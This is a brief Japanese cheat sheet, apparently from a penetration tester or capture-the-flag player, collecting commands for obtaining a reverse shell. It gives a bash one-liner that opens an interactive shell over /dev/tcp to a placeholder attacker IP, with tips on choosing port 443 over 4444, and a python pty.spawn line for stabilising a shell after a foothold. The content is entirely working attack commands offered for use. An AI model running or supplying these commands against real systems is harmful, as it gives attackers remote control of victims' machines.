# reverse shell取得のためのスクリプトまとめ

1. 安定するが、root権限ないと動かないこともある。また、経験上4444だとダメで443だといける？みたいなケースがあった。
```.sh
bash -c "bash -i >& /dev/tcp/<attacker IP>/4444 0>&1"
```

2. footholdを取った後にシェルを安定させることができる。
```
python -c 'import pty;pty.spawn("/bin/sh")'
```